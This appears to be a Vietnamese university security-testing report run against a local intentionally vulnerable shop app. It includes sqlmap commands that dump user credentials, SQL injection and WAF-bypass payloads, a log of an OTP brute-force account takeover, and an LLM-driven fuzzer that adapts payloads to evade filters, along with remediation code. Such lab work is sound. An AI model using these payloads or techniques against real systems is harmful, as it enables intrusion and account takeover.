# BÁO CÁO THỰC NGHIỆM: KIỂM CHỨNG BẢO MẬT VỚI SQLMAP, TỰ ĐỘNG HÓA BRUTE-FORCE OTP VÀ NGHIÊN CỨU AI FUZZER THÍCH ỨNG
### Người thực hiện: Lê Chí Hoàng Long (MSSV: 23120294)
**Chủ đề:** Security Testing for Web Applications — FIT@HCMUS (HK1)  
**Nội dung phụ trách:** Demo sqlmap (L1), AI Fuzzer Feedback Loop (L2, L3), và Thực nghiệm bổ sung 2 nhóm OWASP mở rộng (A02: Cryptographic Failures & A07: Authentication Failures)

---

## MỤC LỤC
1. [TỔNG QUAN VÀ BỐI CẢNH THỬ NGHIỆM](#1-tổng-quan-và-bối-cảnh-thử-nghiệm)
2. [THỰC NGHIỆM KIỂM CHỨNG BẢO MẬT BẰNG SQLMAP (A03 & A02)](#2-thực-nghiệm-kiểm-chứng-bảo-mật-bằng-sqlmap-a03--a02)
   - [2.1. Chuỗi tích hợp công cụ DevSecOps (DAST Toolchain)](#21-chuỗi-tích-hợp-công-cụ-devsecops-dast-toolchain)
   - [2.2. Triển khai 4 kịch bản kiểm thử sqlmap](#22-triển-khai-4-kịch-bản-kiểm-thử-sqlmap)
   - [2.3. Phân tích kết quả log thực tế](#23-phân-tích-kết-quả-log-thực-tế)
   - [2.4. Phân tích nguyên nhân gốc và giải pháp khắc phục](#24-phân-tích-nguyên-nhân-gốc-và-giải-pháp-khắc-phục)
   - [2.5. Đánh giá ưu điểm và điểm mù của sqlmap](#25-đánh-giá-ưu-điểm-và-điểm-mù-của-sqlmap)
3. [THỰC NGHIỆM TỰ ĐỘNG HÓA TẤN CÔNG VÉT CẠN OTP (A07: IDENTIFICATION AND AUTHENTICATION FAILURES)](#3-thực-nghiệm-tự-động-hóa-tấn-công-vét-cạn-otp-a07-identification-and-authentication-failures)
   - [3.1. Bối cảnh & Lỗ hổng cơ chế Phục hồi mật khẩu](#31-bối-cảnh--lỗ-hổng-cơ-chế-phục-hồi-mật-khẩu)
   - [3.2. Thiết kế kịch bản tự động hóa đa luồng (`brute_force_otp.py`)](#32-thiết-kế-kịch-bản-tự-động-hóa-đa-luồng-brute_force_otppy)
   - [3.3. Kết quả thực nghiệm và Minh chứng chiếm quyền tài khoản (ATO)](#33-kết-quả-thực-nghiệm-và-minh-chứng-chiếm-quyền-tài-khoản-ato)
   - [3.4. Nguyên nhân gốc và Giải pháp khắc phục triệt để](#34-nguyên-nhân-gốc-và-giải-pháp-khắc-phục-triệt-để)
4. [NGHIÊN CỨU VÀ PHÁT TRIỂN MODULE AI FUZZER THÍCH ỨNG](#4-nghiên-cứu-và-phát-triển-module-ai-fuzzer-thích-ứng)
   - [4.1. Đặt vấn đề: Giới hạn của Fuzzer từ điển tĩnh](#41-đặt-vấn-đề-giới-hạn-của-fuzzer-từ-điển-tĩnh)
   - [4.2. Kiến trúc vòng lặp phản hồi thích ứng (Adaptive Feedback Loop)](#42-kiến-trúc-vòng-lặp-phản-hồi-thích-ứng-adaptive-feedback-loop)
   - [4.3. Môi trường kiểm thử thực nghiệm (WAF Lab cổng 3001)](#43-môi-trường-kiểm-thử-thực-nghiệm-waf-lab-cổng-3001)
   - [4.4. Đo lường và đánh giá đối chứng Benchmark 3 nhánh](#44-đo-lường-và-đánh-giá-đối-chứng-benchmark-3-nhánh)
   - [4.5. Đánh giá học thuật: Trade-off và Tính tái lập (Reproducibility)](#45-đánh-giá-học-thuật-trade-off-và-tính-tái-lập-reproducibility)
   - [4.6. Thảo luận mở rộng: Vòng đời thích ứng khi WAF nâng cấp](#46-thảo-luận-mở-rộng-vòng-đời-thích-ứng-khi-waf-nâng-cấp)
5. [TỔNG KẾT VÀ BẢN ĐỒ ĐÓNG GÓP](#5-tổng-kết-và-bản-đồ-đóng-góp)

---

## 1. TỔNG QUAN VÀ BỐI CẢNH THỬ NGHIỆM

Trong quy trình phát triển và kiểm thử phần mềm hiện đại (DevSecOps), kiểm thử bảo mật động (Dynamic Application Security Testing - DAST) đóng vai trò then chốt nhằm phát hiện các lỗ hổng tồn tại trên ứng dụng ở trạng thái đang chạy (runtime). Tuy nhiên, các công cụ quét tự động bề mặt thường dừng lại ở mức cảnh báo tiềm ẩn, dẫn đến nguy cơ báo động giả (False Positives) hoặc thiếu bằng chứng xác thực mức độ ảnh hưởng của lỗ hổng.

Báo cáo này tổng hợp toàn bộ các kết quả thực nghiệm chuyên sâu do **Lê Chí Hoàng Long** phụ trách trên ứng dụng thực nghiệm EShop, bao gồm cả các phân công cốt lõi và các phân công mở rộng nhằm nâng độ phủ lên **5 nhóm OWASP Top 10:2021**:
1. **Kiểm chứng sâu (Data-driven Verification) với `sqlmap`:** Xây dựng chuỗi tích hợp từ cảnh báo của ZAP, nạp gói tin HTTP thô để xác minh SQL Injection (**A03**) và trích xuất dữ liệu CSDL SQLite.
2. **Khai thác chứng minh lưu trữ mật khẩu Plaintext (**A02: Cryptographic Failures**):** Dùng `sqlmap` dump bảng `users` (`-C email,password`), chứng minh mật khẩu hệ thống hoàn toàn không được băm hay mã hóa.
3. **Tự động hóa tấn công vét cạn OTP (**A07: Identification and Authentication Failures**):** Viết script Python đa luồng (`brute_force_otp.py`) khai thác lỗ hổng không gian khóa OTP 4 số và thiếu rate limiting trên `/api/reset-password` để chiếm quyền tài khoản (Account Takeover).
4. **Nghiên cứu ứng dụng AI Fuzzer thích ứng (Adaptive Feedback Loop):** Giải quyết bài toán vượt qua bộ lọc đầu vào (WAF) khi phương pháp kiểm thử dùng danh sách từ điển tĩnh truyền thống bị vô hiệu hóa.

---

## 2. THỰC NGHIỆM KIỂM CHỨNG BẢO MẬT BẰNG SQLMAP (A03 & A02)

### 2.1. Chuỗi tích hợp công cụ DevSecOps (DAST Toolchain)
Quy trình thực nghiệm được thiết kế khép kín theo chuỗi công cụ tự động hóa:
* **Giai đoạn 1 (Quét tự động):** Công cụ OWASP ZAP rà soát toàn bộ bề mặt ứng dụng EShop và phát hiện cảnh báo SQL Injection tại:
  $$\text{Endpoint: } \texttt{GET /api/products?search=\%27}$$
  *(Bằng chứng: Máy chủ phản hồi mã lỗi HTTP 500 Internal Server Error).*
* **Giai đoạn 2 (Trích xuất gói tin):** Gói tin HTTP hoàn chỉnh được trích xuất từ proxy thành tệp `search_request.txt` (`search.req`), lưu trữ đầy đủ các tiêu đề (Headers), Cookie, Origin, Referer và mã thông báo xác thực người dùng (**JWT Bearer Token**).
* **Giai đoạn 3 (Kiểm chứng chuyên sâu):** Sử dụng `sqlmap` nạp trực tiếp gói tin thô để kiểm thử tự động, trích xuất dữ liệu đối chứng mà không cần cấu hình thủ công lại phiên làm việc.

---

### 2.2. Triển khai 4 kịch bản kiểm thử sqlmap
Hệ thống kịch bản kiểm thử được tự động hóa qua tập lệnh `run_sqlmap_demo.sh`, ánh xạ trọn vẹn 3 nguyên lý cốt lõi của kiểm thử tự động (Record & Playback, Data-driven, Checkpoints):

```
                                  ┌── [Kịch bản 1] Khảo sát ban đầu & Kiểm tra cấu hình kết nối
                                  │
                                  ├── [Kịch bản 2] Quét kiểm thử tham số GET trực tiếp (-p search)
BỘ KỊCH BẢN KIỂM THỬ SQLMAP ──────┤
                                  ├── [Kịch bản 3] Record & Playback trích xuất 7 bảng CSDL SQLite
                                  │
                                  └── [Kịch bản 4] Dump bảng users chứng minh Plaintext Password (A02)
```

#### Kịch bản 1: Khảo sát ban đầu & Kiểm tra cấu hình kết nối (Target Fingerprinting)
* **Mục tiêu:** Xác định trạng thái hoạt động của máy chủ mục tiêu, phiên bản nền tảng công nghệ web và hệ quản trị CSDL backend mà không can thiệp sâu vào cấu trúc dữ liệu.
* **Lệnh thực thi:**
  ```bash
  sqlmap -u "http://localhost:3000/api/products?search=phone" --batch --banner
  ```

#### Kịch bản 2: Quét kiểm thử tham số GET trực tiếp (Direct Parameter Scanning)
* **Mục tiêu:** Chỉ định cụ thể tham số nghi vấn (`-p search`), áp dụng phân tích đối chứng sai khác (Differential Analysis) và kiểm tra tính khả thi của việc khai thác trên hệ CSDL SQLite.
* **Lệnh thực thi:**
  ```bash
  sqlmap -u "http://localhost:3000/api/products?search=phone" -p search --dbms=SQLite --batch --current-db
  ```

#### Kịch bản 3: Tái hiện khai thác qua Raw HTTP Request (Record & Playback)
* **Mục tiêu:** Tái hiện nguyên vẹn ngữ cảnh gói tin HTTP thô từ công cụ bắt gói tin (kèm JWT Bearer Token hợp lệ), thực thi kiểm thử nâng cao và trích xuất danh sách cấu trúc bảng dữ liệu (`--tables`).
* **Lệnh thực thi:**
  ```bash
  sqlmap -r search_request.txt -p search --dbms=SQLite --batch --tables
  ```

#### Kịch bản 4: Dump bảng users chứng minh Cryptographic Failures (A02)
* **Mục tiêu:** Tận dụng lỗ hổng SQL Injection đã kiểm chứng để trích xuất trực tiếp dữ liệu nhạy cảm trong bảng `users`, đánh giá cơ chế bảo vệ mật khẩu của SUT và cung cấp bằng chứng cho lỗ hổng **OWASP A02: Cryptographic Failures**.
* **Lệnh thực thi:**
  ```bash
  sqlmap -r search_request.txt -p search --dbms=SQLite --batch -T users -C email,password --dump
  ```

---

### 2.3. Phân tích kết quả log thực tế

Toàn bộ kết quả thực nghiệm thực tế được lưu trữ tại thư mục `demo/sqlmap/sqlmap-logs/`:

#### Log Kịch bản 1 (`scenario_1_proxy_check.log`):
* `sqlmap` kết nối thành công tới cổng 3000 và nhận diện chính xác cấu trúc nền tảng:
  ```text
  web application technology: Express
  back-end DBMS: SQLite
  ```

#### Log Kịch bản 2 (`scenario_2_param_scan.log`):
* `sqlmap` tự động tái sử dụng phiên làm việc đã lưu (`resumed from stored session`), xác nhận tham số `search (GET)` dính lỗi SQL Injection dạng **UNION query** (Generic UNION query 6 cột).
* Đối với cờ `--current-db`, công cụ ghi nhận cảnh báo kỹ thuật chuẩn xác:
  ```text
  [WARNING] on SQLite it is not possible to get name of the current database
  ```
  *Giải thích kỹ thuật:* Khác với MySQL, Oracle hay PostgreSQL quản lý dữ liệu qua hệ thống Database Catalog phân cấp, **SQLite là hệ quản trị CSDL dạng tệp tin cục bộ (file-based single file `database.sqlite`)**. Do đó, SQLite không có khái niệm "tên CSDL hiện tại", việc `sqlmap` xuất cảnh báo này là hoàn toàn chính xác theo đặc tả kỹ thuật của hệ thống.

#### Log Kịch bản 3 (`scenario_3_raw_request.log`):
* `sqlmap` phân tích tệp `search_request.txt`, phát hiện lỗ hổng JWT (thiếu trường `exp`), tiêm payload UNION query:
  ```sql
  search=phone' UNION ALL SELECT NULL,NULL,CONCAT(CONCAT('qpvkq','...'),'qvpbq'),NULL,NULL,NULL-- vMds
  ```
* **Kết quả khai thác thành công:** `sqlmap` trích xuất trọn vẹn danh mục **7 bảng dữ liệu thật** từ tệp SQLite của hệ thống:
  ```text
  [7 tables]
  +-----------------+
  | categories      |
  | coupon_usage    |
  | coupons         |
  | orders          |
  | products        |
  | sqlite_sequence |
  | users           |
  +-----------------+
  ```

#### Log Kịch bản 4 (`sqlmap_dump_passwords.log`) — Bằng chứng OWASP A02:
* `sqlmap` trích xuất thành công 2 bản ghi người dùng trong bảng `users`:
  ```text
  Database: <current>
  Table: users
  [2 entries]
  +-----------------+-----------------+
  | email           | password        |
  +-----------------+-----------------+
  | admin@eshop.com | Admin123!       |
  | test@eshop.com  | Test1234!       |
  +-----------------+-----------------+
  ```
* **Đánh giá lỗ hổng A02 (Cryptographic Failures):**
  - Mật khẩu của cả tài khoản quản trị (`Admin123!`) lẫn người dùng thông thường (`Test1234!`) đều hiển thị ở dạng **văn bản thô (Plaintext)**.
  - Hoàn toàn không có bất kỳ thuật toán băm bảo mật (như bcrypt, Argon2id, PBKDF2) hay muối (Salt) nào được sử dụng.
  - Phân loại điểm yếu: **CWE-312 (Cleartext Storage of Sensitive Information)** và **CWE-256 (Unprotected Storage of Credentials)**.

---

### 2.4. Phân tích nguyên nhân gốc và giải pháp khắc phục

#### Nguyên nhân gốc (Vulnerability Root Cause):
Tại tệp mã nguồn `backend/server.js` (dòng 141 – 151), đoạn mã xử lý tìm kiếm sản phẩm vi phạm trực tiếp nguyên tắc bảo mật cơ bản khi sử dụng kỹ thuật **nối chuỗi trực tiếp (String Concatenation)** biến đầu vào chưa kiểm soát vào câu lệnh SQL:

```javascript
// ⚠️ LỖ HỔNG BẢO MẬT: Nối chuỗi trực tiếp dữ liệu người dùng
app.get("/api/products", (req, res) => {
  const searchQuery = req.query.search;
  if (searchQuery) {
    const query = `SELECT * FROM products WHERE name LIKE '%${searchQuery}%'`;
    db.all(query, [], (err, rows) => {
      if (err) return res.status(500).send(`<h1>Database Error</h1><p>${err.message}</p>`);
      res.json(rows);
    });
  } // ...
});
```

Khi người dùng nhập dấu nháy đơn (`'`), cấu trúc câu truy vấn bị phá vỡ (`LIKE '%'%''`), dẫn đến lỗi cú pháp CSDL trả về mã HTTP 500 và cho phép kẻ tấn công chèn thêm các mệnh đề điều kiện hoặc câu truy vấn `UNION`.

#### Giải pháp khắc phục triệt để (Secure Remediation):
Áp dụng cơ chế **Truy vấn có tham số hóa (Parameterized Query / Prepared Statements)** theo tiêu chuẩn an toàn mã nguồn SEC-01:

```javascript
// ✅ GIẢI PHÁP AN TOÀN: Sử dụng tham số hóa phân tách dữ liệu
app.get("/api/products", (req, res) => {
  const searchQuery = req.query.search;
  if (searchQuery) {
    const query = "SELECT * FROM products WHERE name LIKE ?";
    const searchPattern = `%${searchQuery}%`;
    db.all(query, [searchPattern], (err, rows) => {
      if (err) return res.status(500).json({ error: "Lỗi xử lý cơ sở dữ liệu." });
      res.json(rows);
    });
  } // ...
});
```

Đồng thời, đối với **A02**, backend bắt buộc phải mã hóa băm mật khẩu trước khi lưu trữ vào CSDL bằng thư viện chuẩn công nghiệp:
```javascript
// ✅ GIẢI PHÁP AN TOÀN CHO A02: Băm mật khẩu bằng bcrypt
const bcrypt = require("bcrypt");
const saltRounds = 12;
const hashedPassword = await bcrypt.hash(password, saltRounds);
// Lưu hashedPassword vào cột password
```

---

### 2.5. Đánh giá ưu điểm và điểm mù của sqlmap

* **Ưu điểm vượt trội:**
  * Khả năng tự động hóa kiểm thử mức dữ liệu (Data-driven) mạnh mẽ với kho payload phong phú hỗ trợ 6 kỹ thuật tiêm lệnh (BEUSTQ).
  * Hỗ trợ nguyên lý *Record & Playback* xuất sắc thông qua cờ `-r`, tiết kiệm thời gian thiết lập lại phiên làm việc.
* **Điểm mù kỹ thuật (Blind Spots):**
  * `sqlmap` phụ thuộc vào các kịch bản tamper có sẵn. Khi gặp các hệ thống có bộ lọc đầu vào (WAF) tùy biến hoặc bộ lọc phi chuẩn, `sqlmap` sẽ liên tục thử nghiệm danh sách payload mặc định dẫn đến việc bị chặn hàng loạt hoặc bị khóa IP mà không thể tự động suy luận để điều chỉnh cú pháp thích ứng trong thời gian thực.

---

## 3. THỰC NGHIỆM TỰ ĐỘNG HÓA TẤN CÔNG VÉT CẠN OTP (A07: IDENTIFICATION AND AUTHENTICATION FAILURES)

### 3.1. Bối cảnh & Lỗ hổng cơ chế Phục hồi mật khẩu

Lỗ hổng **A07:2021 — Identification and Authentication Failures** xuất hiện trên cặp API phục hồi mật khẩu tại `backend/server.js`:
* `POST /api/forgot-password`: Nhận email người dùng, sinh mã xác thực ngẫu nhiên `reset_token` lưu vào CSDL.
* `POST /api/reset-password`: Nhận `{ email, resetToken, newPassword }` và cập nhật mật khẩu mới nếu mã trùng khớp.

```javascript
// Trích xuất mã nguồn tại backend/server.js (dòng 68 - 98)
app.post("/api/forgot-password", (req, res) => {
  const { email } = req.body;
  db.get("SELECT * FROM users WHERE email = ?", [email], (err, user) => {
    if (!user) return res.status(404).json({ error: "User not found" });
    const resetToken = Math.floor(1000 + Math.random() * 9000).toString();
    db.run("UPDATE users SET reset_token = ? WHERE id = ?", [resetToken, user.id], ...);
  });
});

app.post("/api/reset-password", (req, res) => {
  const { email, resetToken, newPassword } = req.body;
  db.run("UPDATE users SET password = ?, reset_token = NULL WHERE email = ? AND reset_token = ?",
    [newPassword, email, resetToken], function (err) {
      if (this.changes === 0) return res.status(400).json({ error: "Invalid token or email" });
      res.json({ message: "Password reset successfully" });
  });
});
```

#### Phân tích 3 điểm yếu bảo mật nghiêm trọng:
1. **Không gian khóa mã OTP quá nhỏ (CWE-330: Insufficient Randomness):** Mã OTP được sinh bởi `Math.floor(1000 + Math.random() * 9000)`, chỉ gồm đúng 4 chữ số thập phân nằm trong khoảng $[1000 - 9999]$. Tổng không gian tìm kiếm là $9999 - 1000 + 1 = 9000$ giá trị.
2. **Hoàn toàn không có Rate Limiting (CWE-307: Excessive Authentication Attempts):** Endpoint `/api/reset-password` không có bất kỳ bộ đếm số lần thử, không áp dụng CAPTCHA và không khóa IP/tài khoản khi gửi nhiều request thất bại liên tiếp.
3. **Mã không bị vô hiệu hóa khi đoán sai (CWE-640: Weak Recovery Mechanism):** Máy chủ chỉ so khớp và trả về HTTP 400 mà không hủy bỏ mã `reset_token`, tạo điều kiện cho kẻ tấn công thoải mái gửi hàng ngàn request dò tìm mã chính xác.

---

### 3.2. Thiết kế kịch bản tự động hóa đa luồng (`brute_force_otp.py`)

Tập lệnh `demo/brute_force_otp/brute_force_otp.py` được xây dựng để tự động hóa trọn vẹn quy trình tấn công:
* **Kiến trúc đa luồng:** Sử dụng `ThreadPoolExecutor` với 30 worker song song để tối đa hóa băng thông khai thác mà không làm sập tiến trình Node.js/SQLite backend.
* **Cơ chế ngắt tức thì (Short-circuit Termination):** Sử dụng `threading.Event` (`stop_event`). Ngay khi một luồng nhận được HTTP 200 từ máy chủ, cờ ngắt được kích hoạt lập tức để dừng toàn bộ 8.900+ request còn lại trong hàng đợi.
* **Quy trình 3 giai đoạn tự động:**
  1. *Giai đoạn 1:* Kích hoạt yêu cầu quên mật khẩu qua `POST /api/forgot-password` cho tài khoản mục tiêu (`admin@eshop.com`).
  2. *Giai đoạn 2:* Vét cạn không gian OTP $1000 - 9999$.
  3. *Giai đoạn 3 (Account Takeover Verification):* Ngay sau khi đổi mật khẩu thành công, script tự động thực hiện `POST /api/login` với mật khẩu mới (`PwnedAdmin2026!`), trích xuất mã thông báo JWT để chứng minh quyền kiểm soát tài khoản quản trị viên.

---

### 3.3. Kết quả thực nghiệm và Minh chứng chiếm quyền tài khoản (ATO)

Toàn bộ quá trình thực nghiệm được ghi nhận tại `demo/brute_force_otp/brute_force_otp.log`:

```text
[2026-10-18 03:08:10] [INFO] [*] [Giai đoạn 1] Khởi tạo yêu cầu đặt lại mật khẩu cho: admin@eshop.com
[2026-10-18 03:08:10] [INFO]     Target: POST http://localhost:3000/api/forgot-password
[2026-10-18 03:08:10] [INFO] [✔] Server phản hồi: Mã đặt lại mật khẩu đã được tạo
[2026-10-18 03:08:10] [INFO]     [Thông tin kiểm chứng SUT] Server đã sinh OTP cho tài khoản: 1233
[2026-10-18 03:08:11] [INFO] ================================================================================
[2026-10-18 03:08:11] [INFO]  BẮT ĐẦU TẤN CÔNG VÉT CẠN OTP (A07 - Authentication Failures)
[2026-10-18 03:08:11] [INFO]  Mục tiêu: admin@eshop.com | Dải OTP: [1000 - 9999]
[2026-10-18 03:08:11] [INFO]  Không gian tìm kiếm: 9000 mã khả dĩ | Số luồng song song: 30
[2026-10-18 03:08:11] [INFO] ================================================================================
[2026-10-18 03:08:11] [INFO] [*] Tiến độ vét cạn: Đã gửi 1 requests... Đang thử OTP ~ 1000
[2026-10-18 03:08:11] [INFO] [★★★] TẤN CÔNG THÀNH CÔNG! ĐÃ TÌM THẤY OTP CHÍNH XÁC: 1233
[2026-10-18 03:08:11] [INFO]       Phản hồi: Password reset successfully
[2026-10-18 03:08:12] [INFO] --------------------------------------------------------------------------------
[2026-10-18 03:08:12] [INFO] [✔] KẾT QUẢ: Tấn công THÀNH CÔNG!
[2026-10-18 03:08:12] [INFO]     - Mã OTP giải mã thành công: 1233
[2026-10-18 03:08:12] [INFO]     - Số lượt requests đã thử: 263
[2026-10-18 03:08:12] [INFO]     - Thời gian thực thi: 0.32 giây
[2026-10-18 03:08:12] [INFO]     - Tốc độ vét cạn trung bình: 825.5 requests/giây
[2026-10-18 03:08:12] [INFO]     - Mật khẩu mới được thiết lập: PwnedAdmin2026!
[2026-10-18 03:08:12] [INFO] [*] [Giai đoạn 3] Kiểm chứng chiếm quyền tài khoản (Account Takeover Verification)
[2026-10-18 03:08:12] [INFO]     Target: POST http://localhost:3000/api/login với mật khẩu mới: PwnedAdmin2026!
[2026-10-18 03:08:12] [INFO] [✔] ĐĂNG NHẬP THÀNH CÔNG! CHIẾM QUYỀN TÀI KHOẢN HOÀN TẤT!
[2026-10-18 03:08:12] [INFO]     - User ID: 1 | Email: admin@eshop.com | Role: admin
[2026-10-18 03:08:12] [INFO]     - JWT Token trích xuất: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

#### Phân tích số liệu thực nghiệm:
* **Hiệu suất tấn công:** Chỉ mất **0.32 giây** với **263 requests**, script đã tìm trúng mã `1233`, đổi mật khẩu thành công và chiếm trọn quyền điều khiển tài khoản Admin.
* **Đánh giá rủi ro (Risk Assessment):**
  - Mức độ dễ khai thác: **Rất cao (Exploitability: HIGH)** — Không đòi hỏi quyền đặc quyền, chỉ cần biết email mục tiêu.
  - Tác động: **Nghiêm trọng (Impact: CRITICAL)** — Toàn quyền kiểm soát tài khoản quản trị hệ thống, can thiệp danh mục sản phẩm, đơn hàng và dữ liệu người dùng.

---

### 3.4. Nguyên nhân gốc và Giải pháp khắc phục triệt để

#### Khuyến nghị khắc phục chuẩn DevSecOps:
1. **Thiết lập Rate Limiting (CWE-307):** Tích hợp thư viện `express-rate-limit` giới hạn tối đa 5 lần gửi yêu cầu đặt lại mật khẩu trong 15 phút cho mỗi địa chỉ IP hoặc tài khoản.
2. **Sử dụng CSPRNG Token thay cho OTP 4 số (CWE-330):** Sử dụng `crypto.randomBytes(32).toString('hex')` để tạo token ngẫu nhiên an toàn mật mã có độ dài 64 ký tự hex (không gian $2^{256}$ giá trị, bất khả thi đối với tấn công brute-force).
3. **Giới hạn thời gian hiệu lực (Expiration TTL):** Mã phục hồi mật khẩu chỉ được có hiệu lực trong 5 – 10 phút.
4. **Hủy token sau khi sử dụng hoặc sau 3 lần nhập sai (One-time usage / Invalidation):** Vô hiệu hóa ngay lập tức token nếu người dùng nhập sai quá 3 lần.

---

## 4. NGHIÊN CỨU VÀ PHÁT TRIỂN MODULE AI FUZZER THÍCH ỨNG

### 4.1. Đặt vấn đề: Giới hạn của Fuzzer từ điển tĩnh
Các công cụ Fuzzer truyền thống chủ yếu hoạt động theo phương thức "gửi mù" (Brute-force) một danh sách từ điển payload tĩnh có sẵn. Khi ứng dụng triển khai lớp phòng thủ lọc đầu vào (WAF), toàn bộ các payload chứa từ khóa hoặc khoảng trắng mặc định đều bị máy chủ chặn (HTTP 400/403). Điều này dẫn đến hai hạn chế nghiêm trọng:
1. Tiêu tốn băng thông mạng và số lượng request lớn.
2. Dễ bị hệ thống phòng thủ phát hiện và kích hoạt cơ chế khóa IP kiểm thử.

---

### 4.2. Kiến trúc vòng lặp phản hồi thích ứng (Adaptive Feedback Loop)

Để khắc phục điểm mù trên, module `ai_fuzzer.py` được thiết kế theo mô hình **AI Fuzzer Mức 2 (Closed-loop Adaptive Fuzzing)** với chu trình 4 giai đoạn khép kín:

```
[1. Test Input ban đầu] ──> [2. Server WAF Lab] ──> [Trả về HTTP 403 & Lý do chặn]
          ▲                                                           │
          │                                                           ▼
[4. Sinh Payload thích ứng] <── [3. AI Reasoning (LLM) phân tích phản hồi WAF]
```

1. **Phát Test Input (Injection):** Fuzzer gửi payload cơ sở ban đầu (`' OR '1'='1`).
2. **Thu thập phản hồi (Observation):** Máy chủ WAF chặn gói tin, phản hồi mã HTTP 403 Forbidden kèm chuỗi thông báo nguyên nhân (ví dụ: `Keyword or space detected`).
3. **Suy luận ngữ nghĩa (AI Reasoning):** Fuzzer đóng gói bối cảnh và lý do chặn vào prompt, gửi tới mô hình ngôn ngữ lớn (LLM):
   * *Yêu cầu:* Phân tích cơ chế bộ lọc và gợi ý kỹ thuật thay thế tương đương ngữ nghĩa trong chuẩn SQL.
   * *Suy luận:* Để thay thế khoảng trắng mà không vi phạm regex kiểm tra từ khóa, chuẩn SQL cho phép sử dụng chú thích nội tuyến (inline comment) dạng `/**/`.
4. **Tái kiểm thử và đạt Checkpoint:** AI trả về payload thích ứng `1'/**/OR/**/'1'='1'`. Fuzzer gửi lại payload này, vượt qua bộ lọc thành công và nhận phản hồi **HTTP 200 OK**.

---

### 4.3. Môi trường kiểm thử thực nghiệm (WAF Lab cổng 3001)

Nhằm phục vụ bài thí nghiệm có đối chứng, hệ thống thiết lập máy chủ lab riêng biệt tại tệp `backend/server_fuzzer_lab.js` (chạy trên cổng 3001) tích hợp middleware `backend/waf_middleware.js` hỗ trợ 2 cấp độ lọc:
* **Level 1 (Mặc định thử nghiệm):** Áp dụng biểu thức chính quy bắt khoảng trắng bao quanh từ khóa SQL (`/(^|\s+)(OR|AND|UNION|SELECT)(\s+|$)/i`). Cấp độ này mô phỏng lỗi lọc ngây thơ, có thể bị bypass bằng kỹ thuật comment lồng `/**/`.
* **Level 2 (Strict nâng cao):** Chặn cả comment (`/*`, `*/`, `--`), dấu chấm phẩy và ranh giới từ khóa.

---

### 4.4. Đo lường và đánh giá đối chứng Benchmark 3 nhánh

Thực nghiệm đo lường được tiến hành theo phương pháp kiểm soát biến số qua tập lệnh `benchmark_fuzzer.py` trên cùng một máy chủ mục tiêu (cổng 3001) trong ngân sách giới hạn $N \le 50$ requests.

#### Bảng số liệu kết quả thực nghiệm đối chứng:

| Nhánh kiểm thử | Phương pháp sinh payload | Số requests cần gửi | Thời gian hoàn tất (s) | Tỷ lệ giảm request so với Baseline |
|---|---|:---:|:---:|:---:|
| **Nhánh 1** | Mảng từ điển mẫu tĩnh cổ điển (Synthetic Wordlist) | **14** | 0.027s | Baseline (0%) |
| **Nhánh 2** | Payload AI sinh sẵn không có feedback (Mức 1) | **6** | 0.002s | Giảm **57.1%** |
| **Nhánh 3** | **AI Fuzzer Feedback Loop thích ứng (Mức 2)** | **2** | 0.450s | **Giảm 85.7%** |

*(Số liệu được kết xuất chuẩn hóa từ tệp `demo/ai_fuzzer/benchmark_results.json`).*

#### Phân tích biểu đồ hiệu năng:
* **Nhánh 1:** Do nạp danh sách tĩnh, fuzzer phải thử lần lượt từng phần tử; các chuỗi có khoảng trắng đều bị WAF từ chối cho đến khi tình cờ duyệt đến chuỗi thứ 14 có định dạng `/**/`.
* **Nhánh 3:** Nhờ có vòng lặp phản hồi, fuzzer chỉ mất **đúng 1 request mồi để nhận diện bộ lọc** và **1 request tiếp theo để khai thác thành công**, tiết kiệm tới **85.7% lưu lượng mạng**.

---

### 4.5. Đánh giá học thuật: Trade-off và Tính tái lập (Reproducibility)

#### Phân tích sự đánh đổi (Trade-off):
* **Lợi thế:** Giảm thiểu đột biến số lượng request, giảm thiểu nguy cơ làm quá tải dịch vụ (Denial of Service) và hạn chế kích hoạt các cơ chế Rate-limiting của hạ tầng mạng.
* **Chi phí đánh đổi:** Thời gian phản hồi của Nhánh 3 cao hơn (~0.45s so với 0.027s) do phát sinh độ trễ mạng (Network Latency) và thời gian suy luận (Inference Time) khi gọi API LLM.

#### Đảm bảo Tính tái lập (Reproducibility) trong kiểm thử phần mềm:
* Mô hình AI mang tính chất ngẫu nhiên thống kê (Stochastic/Non-deterministic), có thể sinh ra các biến thể khác nhau giữa các lần chạy hoặc gặp sự cố gián đoạn đường truyền mạng khi báo cáo.
* **Giải pháp chuẩn hóa:** Module tích hợp cờ `--playback` đọc dữ liệu từ tệp `fuzzer_cache.json`. Chế độ này "đóng băng" kết quả thực nghiệm thực tế, cho phép tái hiện quy trình thích ứng một cách nhất quán 100% mà không phụ thuộc vào kết nối Internet, đáp ứng chặt chẽ tiêu chuẩn kiểm chứng khoa học.
* **Cơ chế dự phòng:** Hàm `heuristic_adaptation` đóng vai trò lưới an toàn (fallback) bằng mã nguồn Python tĩnh, đảm bảo công cụ không bị dừng đột ngột trong trường hợp mất kết nối API.

---

### 4.6. Thảo luận mở rộng: Vòng đời thích ứng khi WAF nâng cấp

Một câu hỏi học thuật quan trọng: *Khi hệ thống phòng thủ phát hiện kỹ thuật `/**/` và nâng cấp WAF lên Level 2 (chặn cả comment), AI Fuzzer có còn giá trị không?*

Câu trả lời là **CÓ**, và đây chính là ưu điểm vượt trội của AI so với từ điển tĩnh:
* **Với từ điển tĩnh:** Khi WAF thay đổi luật, toàn bộ danh sách 10.000 payload cũ trở nên vô dụng; chuyên gia bảo mật phải phân tích và biên soạn lại từ điển mới thủ công.
* **Với AI Fuzzer:** Khi payload `1'/**/OR/**/'1'='1'` bị WAF Level 2 chặn lại (HTTP 403), tệp cache cũ tự động bị hủy (Cache Invalidation). Vòng lặp `while` trong `ai_fuzzer.py` tiếp tục hoạt động, đóng gói lỗi mới gửi về cho LLM. AI sẽ phân tích cú pháp SQLite ở mức sâu hơn (sử dụng ký tự xuống dòng `%0A`, mã hóa URL, hoặc cấu trúc ngoặc đơn không khoảng trắng `1'OR('1'='1')`) để tiếp tục sinh ra phương án vượt lọc thế hệ tiếp theo.

---

## 5. TỔNG KẾT VÀ BẢN ĐỒ ĐÓNG GÓP

Bảng đối chiếu toàn bộ các sản phẩm bàn giao kỹ thuật của **Lê Chí Hoàng Long (23120294)** theo đề cương seminar:

| Mã đầu việc | Nhóm OWASP | Mô tả kỹ thuật | Tệp sản phẩm bàn giao thực tế | Trạng thái |
|---|:---:|---|---|:---:|
